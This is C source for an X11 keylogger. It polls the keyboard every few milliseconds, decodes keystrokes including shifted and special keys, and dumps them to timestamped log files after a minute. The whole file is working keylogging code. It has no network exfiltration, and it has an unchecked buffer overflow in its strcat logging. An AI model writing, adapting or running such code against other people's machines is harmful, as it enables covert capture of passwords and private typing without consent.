#include <stdio.h>
#include <X11/Xlib.h>
#include <X11/X.h>
#include <unistd.h>
#include <X11/keysym.h>
#include <X11/keysymdef.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <time.h>

#define HOSTNAME ":0"
#define MEMSIZE 5000 // LIMIT MEMORY 
#define SAVESEC 60 // seconds to save

#define SHIFT_INDEX     1  
#define ISO3_INDEX      4 
#define BIT(c, x) ( c[x/8]&(1<<(x%8)) )

Display *disp;
char logmem[MEMSIZE];


char* getkeystr(char *keys, char *saved);
char* keycodetoStr(int keycode, int mod);
int KeyMod(char *keys);
void writelog(int signal);

int main(void)
{ 
    char buf1[32];
    char buf2[32];
    char *keys = buf1;
    char *saved = buf2;
    char *char_ptr;
    
    signal(SIGALRM, &writelog);
    alarm(60);
    disp = XOpenDisplay(HOSTNAME);
    XSynchronize(disp, 1);
    XQueryKeymap(disp, saved); 
    while(1){
      usleep(5000);
      fflush(stdout);
      XQueryKeymap(disp, keys); 
      strcat(logmem, getkeystr(keys, saved));
      char_ptr = saved;
      saved = keys;
      keys = char_ptr;
    }

}

void writelog(int signal){
   puts("Writed");
   FILE *logfile;
   char filename[50];
   time_t now;
   struct tm *now_tm;
   now = time(NULL);
   now_tm = localtime(&now);
   sprintf(filename, "LOG_%d%d%d_%d%d%d.txt", 
           now_tm->tm_mday,
           now_tm->tm_mon, 
           now_tm->tm_year,
           now_tm->tm_hour,
           now_tm->tm_min,
           now_tm->tm_sec);
  
  logfile = fopen(filename, "w");
  fwrite(logmem, sizeof(char), sizeof(logmem), logfile);
  fclose(logfile);
  memset(logmem, 0, sizeof(logmem)-1);
}

char* getkeystr(char *keys, char *saved){
   int keycode;
   for(int i=0; i<32*8; i++)
       if(BIT(keys, i) != BIT(saved, i)){
         if(BIT(keys, i) != 0)
           return keycodetoStr(i, KeyMod(keys));
       }
   return "";
}

char* keycodetoStr(int keycode, int mod){
   KeySym ksym = XKeycodeToKeysym(disp, keycode, mod);
   char *keyname = XKeysymToString(ksym);
   if(strcmp(keyname, "space") == 0) return " ";
   else if(strcmp(keyname, "Return") == 0) return "[ENTER]";
   else if(strcmp(keyname, "BackSpace") == 0) return "[BACK]";
   else if(strcmp(keyname, "Tab") == 0) return "\t";
   else if(strcmp(keyname, "period") == 0) return ".";
   else if(strcmp(keyname, "Control_L") == 0) return "";
   else if(strcmp(keyname, "Control_R") == 0) return "";
   else if(strcmp(keyname, "Alt_L") == 0) return "";
   else if(strcmp(keyname, "Alt_R") == 0) return "";
   else if(strcmp(keyname, "Shift_L") == 0) return "";
   else if(strcmp(keyname, "Shift_R") == 0) return "";
   else if(strcmp(keyname, "at") == 0) return "@";
   else if(strcmp(keyname, "ISO_Level3_Shift") == 0){
      ksym = XKeycodeToKeysym(disp, keycode, ISO3_INDEX);
      keyname = XKeysymToString(ksym);
   }
   else if(strlen(keyname) > 1) return ""; 
   return keyname; 
}
// This function source by https://gist.github.com/Noitidart/0caa18df64884509c4caacfcde79630e#file-x11-keylogger-c-L154
int KeyMod(char *keys)
{
    static int width;
    static XModifierKeymap *mmap;
    int i;
    
    mmap = XGetModifierMapping(disp);
    width = mmap->max_keypermod;
    
    for (i = 0; i < width; i++) {
        KeyCode code;
        code = mmap->modifiermap[ShiftMapIndex*width  +i];
        if (code && 0 != BIT(keys, code)) {return SHIFT_INDEX;}

    }

return 0;
}
